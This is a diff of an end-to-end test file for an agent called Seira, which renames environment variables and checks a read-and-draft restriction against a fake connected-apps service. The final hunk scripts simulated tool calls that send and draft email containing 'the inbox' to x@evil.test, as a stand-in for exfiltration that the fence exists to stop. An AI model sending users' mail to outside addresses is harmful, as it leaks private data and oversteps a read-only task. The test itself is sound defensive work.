@@ -8,7 +8,7 @@ import { launchVerificationServer } from "../scripts/control-seira.ts";
 import { startFakeConnectedApps, type FakeConnectedApps } from "./testing/fake-connected-apps.ts";
 
 // The proactive main agent end to end on a real server (temporary home, the fake Claude CLI) against a stand-in for the
-// connected-apps service: MausBot's default watch, its checks, the one batched run, the brief, Dismiss, presence and
+// connected-apps service: Seira's default watch, its checks, the one batched run, the brief, Dismiss, presence and
 // the read-and-draft fence. Nothing here reaches a real Google account or a model.
 const MINUTE = 60_000;
 // The brief lists only the person's meetings today. Their zone is one where it is midday when the suite starts, so the
@@ -53,13 +53,13 @@ describe("Seira keeps an eye on the day, hidden from the sidebar", () => {
   let api: ReturnType<typeof client>;
   let chief: { id: string; threadId: string };
   let watch: { id: string };
-  const markers = join(tmpdir(), `omb-watch-markers-${process.pid}-${Date.now()}.json`);
+  const markers = join(tmpdir(), `seira-watch-markers-${process.pid}-${Date.now()}.json`);
 
   beforeAll(async () => {
     vi.spyOn(console, "warn").mockImplementation(() => {});
     apps = await startFakeConnectedApps();
     writeFileSync(markers, JSON.stringify({ "Your checks found what is below": WATCH_REPLY }));
-    fixture = await launchVerificationServer({ ...process.env, TZ: MIDDAY_ZONE, OMB_COMPOSIO_BROKER_URL: apps.url, OMB_COMPOSIO_BROKER_TOKEN: apps.token, FAKE_CLAUDE_MARKER_REPLIES: markers });
+    fixture = await launchVerificationServer({ ...process.env, TZ: MIDDAY_ZONE, SEIRA_COMPOSIO_BROKER_URL: apps.url, SEIRA_COMPOSIO_BROKER_TOKEN: apps.token, FAKE_CLAUDE_MARKER_REPLIES: markers });
     api = client(fixture);
     const bots = (await api("GET", "/api/bots")).bots as any[];
     const found = bots.find((bot) => bot.defaultBot && !bot.defaultBot.person);
@@ -220,7 +220,7 @@ describe("a read-and-draft run", () => {
     vi.spyOn(console, "warn").mockImplementation(() => {});
     apps = await startFakeConnectedApps();
     const multi = (slug: string, args: Record<string, unknown>) => ({ name: "COMPOSIO_MULTI_EXECUTE_TOOL", server: "composio", input: { tools: [{ tool_slug: slug, arguments: args }] } });
-    fixture = await launchVerificationServer({ ...process.env, OMB_COMPOSIO_BROKER_URL: apps.url, OMB_COMPOSIO_BROKER_TOKEN: apps.token,
+    fixture = await launchVerificationServer({ ...process.env, SEIRA_COMPOSIO_BROKER_URL: apps.url, SEIRA_COMPOSIO_BROKER_TOKEN: apps.token,
       FAKE_CLAUDE_TOOL_CALLS: JSON.stringify([
         multi("GMAIL_SEND_EMAIL", { recipient_email: "x@evil.test", body: "the inbox" }),
         multi("GMAIL_CREATE_EMAIL_DRAFT", { thread_id: "thread-important", recipient_email: "x@evil.test", body: "the inbox" }),
